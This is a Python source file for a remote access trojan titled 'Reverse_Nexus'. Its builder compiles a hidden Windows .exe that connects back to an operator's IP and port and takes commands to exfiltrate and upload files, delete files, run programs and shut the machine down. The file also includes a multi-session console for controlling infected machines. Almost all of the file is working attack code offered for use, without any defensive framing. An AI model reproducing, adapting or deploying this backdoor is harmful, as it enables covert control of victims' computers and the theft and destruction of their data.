from multiprocessing import connection
import socket
import os
#from vidstream import StreamingServer
#import threading
def generatePayload(ip, port):
    os.system('pip install Pyinstaller')
    code = f"""from http import client
from multiprocessing import connection
import socket
import os
import time
import requests
import win32gui
import win32con
import threading

def switch(word):
    if word == "cd":
        return 1
    elif word == "dir":
        return 2
    elif word == "remove":
        return 3
    elif word == "restart":
        return 4
    elif word == "loading_file":
        return 5
    elif word == "create_file":
        return 6
    elif word == "create_past":
        return 7
    elif word == "shutdown": #shutdown -s -t 00
        return 8
    elif word == "off":
        return 9
    elif word == "run":
        return 10
    elif word == "live":
        return 11


reverse = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

reverse.connect(('{ip}', {port}))


#-------------------------------------------------------------------

def loadfile(nameFile):
    with open(nameFile, "rb") as file:
        while True:
            data = file.read(1024)  
            if not data:
                break
            reverse.send(data)
    
            
def writefile(nameFile, connect):
    recived_data = b''
    if nameFile == "":
        nameFile = "null"
    while True:
        data = connect.recv(1024)
        if not data:
            break
        if data.endswith(b"END_OF_FILE"):
            recived_data += data[:-len(b"END_OF_FILE")]
            break
        recived_data += data

    with open(nameFile,'wb') as file:
        file.write(recived_data)
        

def get_public_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip_info = response.json()
    return ip_info['ip']
#-----------------------------------------------------------------


os.chdir('C:/Users')

key_acesss = True

delimiter_bytes = False

get_ip = False
hwnd = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
message = ""
while key_acesss:
    try:
        
        if delimiter_bytes == True:
            time.sleep(1)
            delimiter_bytes = False
            
        current_directory = str(os.getcwd())
        
        if get_ip == False:
            public_ip = get_public_ip()
            get_ip = True
            
        current_directory += ";" + public_ip + message
        reverse.send(current_directory.encode())
        command = reverse.recv(1024).decode()
        message = ""
        words = command.split(" ")
        
        for word in words:
            option = switch(word)
            if option == 1:
                try:
                    os.chdir(command.replace(command.split(" ")[0], "").replace(" ","",1))
                except Exception as e:
                    message = ";" + str(e)
                break
            elif option == 2:
                current_directory = ""
                list_dir = str(os.listdir(os.getcwd()))
                reverse.send(list_dir.encode())
                reverse.send(b'END_OF_DIR')
                check = reverse.recv(1024).decode()
                break
                    
            elif option == 3:
                os.remove(words[1])
                break
            elif option == 4:
                os.chdir('C:/Users')
                break
            elif option == 5:
                file = command.replace(command.split(" ")[0], "").replace(" ","",1)
                try:
                    loadfile(file)
                    reverse.send(b"END_OF_FILE")
                    delimiter_bytes = True
                    check = reverse.recv(1024).decode()                    
                    break
                except Exception as e:
                    message = ";" + str(e)
                    reverse.send(b"ERROR_FILE_NOT_EXIST!")
                    reverse.send(b"END_OF_FILE")
                    check = reverse.recv(1024).decode()
                    break
                

            elif option == 6:
                file = command.replace(command.split(" ")[0], "").replace(" ","",1)
                writefile(file, reverse)
                current_directory= ""
                
                break
            elif option == 7:
                os.mkdir(words[1])
                break
            elif option == 8:
                os.system('shutdown -s -t 00')
                break
            elif option == 9:
                key_acesss = False
                reverse.close()
                break
            elif option == 10:
                os.system("start " + command.replace(command.split(" ")[0], "").replace(" ","",1))
                break
            elif option == 11:
              #  vitm = ScreenShareClient('localhost',3232)
               # t = threading.Thread(target=vitm.start_stream)
               # t.start()      
                break                


            
    except Exception as e:
        print("Error : " , e)
        reverse.connect(('{ip}', {port}))
                """
    with open("reverse.py", 'w') as file:
        file.write(code)
    file.close()
    
    os.system('pyinstaller reverse.py --onefile')
    print("|Payload Create Sucess!")
    




outNexus = True

class Nexu:
    def __init__(self,conn, address, id):
        self.conn = conn
        self.address = address
        self.key_acesss = True
        self.removed = False
        self.id = id

    def loadfile(self,nameFile):
            with open(nameFile, "rb") as file:
                while True:
                    data = file.read(1024)  
                    if not data:
                        break
                    self.conn.send(data)
            print("|File Enviado!")

                
    def writefile(self,nameFile):
        recived_data = b''
    
        if nameFile == "":
            nameFile = "null"
            
        while True:
            data = self.conn.recv(1024)
            
            if not data:
                break
            
            if data.endswith(b"END_OF_FILE"):
                recived_data += data[:-len(b"END_OF_FILE")]
                break
            
            recived_data += data
        self.conn.send(b'Ok')
        
        with open(nameFile,'wb') as file:
            file.write(recived_data)
            
    def loading_directory(self, list_dir):
        
        while True:
            data = self.conn.recv(1024).decode('utf-8', errors='ignore')
            if not data:
                break
            if data.endswith('END_OF_DIR'): 
                break            
            list_dir += data
        
        list_dir = list_dir.replace("END_OF_DIR","")
        
        self.conn.send(b'Ok')
        
        for dirs in list_dir.split("',"):
            print("| " + dirs + " |") 
            
    def create_file(self,command):
        
        file = command.replace(command.split(" ")[0], "").replace(" ","",1)

        try:
            self.loadfile(file)
            self.conn.send(b"END_OF_FILE")
        except Exception as e:
            print("File not found : " + str(e))
            self.conn.send(b"FILE_NOT_FOUND")
            self.conn.send(b"END_OF_FILE")   
               
    def run_nexu(self):

        dirControl = False 
        current_directory = ""
        commands_ok = ["cd","dir","remove","restart","loading_file","create_file","create_past","shutdown","off", "run","live"]
        
        while self.key_acesss: 
            
            try:       
                if dirControl == True:  
                    
                    list_dir = ""
                    self.loading_directory(list_dir=list_dir)
                    dirControl = False

                current_directory = self.conn.recv(1024).decode()
                current_directory = current_directory.split(";") #GNG
                
                if(len(current_directory) == 3):
                    print("Error in : " + current_directory[2])
                    command = str(input('NEXUS>' + "[" + current_directory[0] + '] ' + "->" + "["+ current_directory[1] +']: ')) 
                else:
                    command = str(input('NEXUS>' + "[" + current_directory[0] + '] ' + "->" + "["+ current_directory[1] +']: ')) 
                    
                firstcommand = command.split(" ")
                teste_valid_command = False
                
                for commands_write in commands_ok:
                    if firstcommand[0] == commands_write:
                        teste_valid_command = True
                    
                if teste_valid_command == True:
                    self.conn.send(command.encode())
                    
                elif firstcommand[0] == "return":
                        global outNexus
                        outNexus = True
                        self.key_acesss = False
                        self.conn.send(command.encode())
    
                else:
                    print("| HELP------> Commands_valids                                |")
                    print("| cd + name past [Enter to past]                             |")        
                    print("| dir [view directorys]                                      |")
                    print("| remove + nameFile [delete file to pc for reverse]          |")
                    print("| restart [back past User]                                   |")
                    print("| loading_file + nameFile [loading file from reverse to you] |")
                    print("| create_file [create file from you to reverse]              |")
                    print("| shutdown [off_pc reverse]                                  |")
                    print("| off [close conection]                                      |")
                    print("| run for execute one process                                |")
                    
                    self.conn.send(command.encode())
                    
                current_directory = ""
            
                if command == 'dir':
                    
                    dirControl = True
                    
                else:
                    
                    dirControl = False
                    
                if command == 'off':
                    outNexus = True
                    self.key_acesss = False
                    self.removed = True
                
                if 'create_file' in command:
                    self.create_file(command=command)
                    
                if 'loading_file' in command:
                    file = command.replace(command.split(" ")[0], "").replace(" ","",1)
                    self.writefile(file)      
                    
                if 'live' == command:
                    pass     

            except Exception as e:
                print("|Error : " , e)
                self.key_acesss = False
    


    

        


os.system('cls')
print('\033[95m'+'|-----------------------------------------------------------------------------------------------------------------------')
print('|██████╗░ ███████╗ ██╗░░░██╗ ███████╗ ██████╗░ ░██████╗ ███████╗ ░░░░░░░░ ███╗░░██╗ ███████╗ ██╗░░██╗ ██╗░░░██╗ ░██████╗')
print('|██╔══██╗ ██╔════╝ ██║░░░██║ ██╔════╝ ██╔══██╗ ██╔════╝ ██╔════╝ ░░░░░░░░ ████╗░██║ ██╔════╝ ╚██╗██╔╝ ██║░░░██║ ██╔════╝')
print('|██████╔╝ █████╗░░ ╚██╗░██╔╝ █████╗░░ ██████╔╝ ╚█████╗░ █████╗░░ ░░░░░░░░ ██╔██╗██║ █████╗░░ ░╚███╔╝░ ██║░░░██║ ╚█████╗░')
print('|██╔══██╗ ██╔══╝░░ ░╚████╔╝░ ██╔══╝░░ ██╔══██╗ ░╚═══██╗ ██╔══╝░░ ░░░░░░░░ ██║╚████║ ██╔══╝░░ ░██╔██╗░ ██║░░░██║ ░╚═══██╗')
print('|██║░░██║ ███████╗ ░░╚██╔╝░░ ███████╗ ██║░░██║ ██████╔╝ ███████╗ ███████╗ ██║░╚███║ ███████╗ ██╔╝╚██╗ ╚██████╔╝ ██████╔╝')
print('|╚═╝░░╚═╝ ╚══════╝ ░░░╚═╝░░░ ╚══════╝ ╚═╝░░╚═╝ ╚═════╝░ ╚══════╝ ╚══════╝ ╚═╝░░╚══╝ ╚══════╝ ╚═╝░░╚═╝ ░╚═════╝░ ╚═════╝░')
print('|-----------------------------------------------------------------------------------------------------------------by Ws')
# sessions, session 2, create session
count_nexus = -1
nexus_list = []
atual_nexus = 0
inicial_nexus = True
createServer = False
ip = 0
port = 0

while True:
    
    os.system('cls')
    os.system('color 5')
    print('|-----------------------------------------------------------------------------------------------------------------------')
    print('|██████╗░ ███████╗ ██╗░░░██╗ ███████╗ ██████╗░ ░██████╗ ███████╗ ░░░░░░░░ ███╗░░██╗ ███████╗ ██╗░░██╗ ██╗░░░██╗ ░██████╗')
    print('|██╔══██╗ ██╔════╝ ██║░░░██║ ██╔════╝ ██╔══██╗ ██╔════╝ ██╔════╝ ░░░░░░░░ ████╗░██║ ██╔════╝ ╚██╗██╔╝ ██║░░░██║ ██╔════╝')
    print('|██████╔╝ █████╗░░ ╚██╗░██╔╝ █████╗░░ ██████╔╝ ╚█████╗░ █████╗░░ ░░░░░░░░ ██╔██╗██║ █████╗░░ ░╚███╔╝░ ██║░░░██║ ╚█████╗░')
    print('|██╔══██╗ ██╔══╝░░ ░╚████╔╝░ ██╔══╝░░ ██╔══██╗ ░╚═══██╗ ██╔══╝░░ ░░░░░░░░ ██║╚████║ ██╔══╝░░ ░██╔██╗░ ██║░░░██║ ░╚═══██╗')
    print('|██║░░██║ ███████╗ ░░╚██╔╝░░ ███████╗ ██║░░██║ ██████╔╝ ███████╗ ███████╗ ██║░╚███║ ███████╗ ██╔╝╚██╗ ╚██████╔╝ ██████╔╝')
    print('|╚═╝░░╚═╝ ╚══════╝ ░░░╚═╝░░░ ╚══════╝ ╚═╝░░╚═╝ ╚═════╝░ ╚══════╝ ╚══════╝ ╚═╝░░╚══╝ ╚══════╝ ╚═╝░░╚═╝ ░╚═════╝░ ╚═════╝░')
    print('|-----------------------------------------------------------------------------------------------------------------by Ws')
    option = input('\n| you need -> ')

    while outNexus == True:
       
            
        if option == 'nexus':
            for s in range(count_nexus + 1):
                print("|[nexus -> " + str(nexus_list[s].id) + "]")
                    
        elif option.split(" ")[0] == "nexu":
            if len(option.split(" ")) == 2 and int(option.split(" ")[1]) < len(nexus_list): 
                option = option.split(" ")[1]
                atual_nexus = option
                inicial_nexus = False
                outNexus =False
            else:
                print("|[ Connection not found!! ]")


        elif option.split(" ")[0] == "server":
            if len(option.split(" ")) == 3:
                ip = option.split("server")[1].split(" ")[1]
                port = int(option.split("server")[1].split(" ")[2])

            else:
                print("|Invalida command :(")
                print("| nexu 3               | example")
                print("| server localhost 8080  | example")


        elif "create payload" in option:
            ip = input("IP : ")
            port = input("PORT : ")
            generatePayload(ip,port)

        elif "start" == option:
            outNexus = False
            break
        elif "update" == option:
                inicial_nexus = True
                outNexus =False
        else:
            print("|[Commands Valids !]")
            print("|[create payload -> create a new payload .exe                     ]")
            print("|[nexus -> list all sessions                                      ]")
            print("|[nexu (numberTheCOnnection) - > select your connect              ]")
            print("|[server localhost 8080 -> init server with connection the started]")
            print("|[update -> recived more connectios                               ]")
            print("|[start -> init service :)                                        ]")
        option = input('\n|the now -> ')       
    
    removed_to_list = False
    
    while outNexus == False:
        
        if createServer == False:
            nexus = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

            os.system('color 5')

            print("|Listen Conection...")
            nexus.bind((ip,int(port)))
            nexus.listen(1)
            createServer = True
            
        elif inicial_nexus == True:
            
            os.system('cls')
            os.system('color 5')
            print('|          ####                        ####  ')      
            print('|          ########  ############  ########  ')      
            print('|          ################################  ')    
            print('|          ##############################    ')     
            print('|            ############################    ')      
            print('|            ##########################      ')     
            print('|          ################################  ')      
            print('|        ####################################')      
            print('|        ####################################')      
            print('|          ########  ############  ########  ')      
            print('|        ##########    ########    ########  ')     
            print('|        ############  ########  ############')      
            print('|            ############################    ')      
            print('|                ####################        ')      
            print('|                  ################          ')      
            print('|                  ####      ####            ')      
            print('|                    ####    ####            ')      
            print('|                    ##########              ')      
            print('|                        ##                  ')  
            print('|                                       By Ws')  
            print("|Listen Conections... :]")
            
            conn, address = nexus.accept()
            count_nexus = count_nexus + 1
            nexu_connection = Nexu(conn,address,count_nexus)
            nexu_connection.run_nexu()
            
            nexus_list.append(nexu_connection)
            
            if nexu_connection.removed:
                nexus_list.remove(nexu_connection)
                count_nexus = count_nexus - 1

            
        elif inicial_nexus == False:
            
            nexus_list[int(atual_nexus)].key_acesss = True
            nexus_list[int(atual_nexus)].run_nexu()
            
            if nexus_list[int(atual_nexus)].removed:
                 nexus_list.remove(nexus_list[int(atual_nexus)])
                 count_nexus = count_nexus - 1
                
            
                
            
            
            
        
        

                
    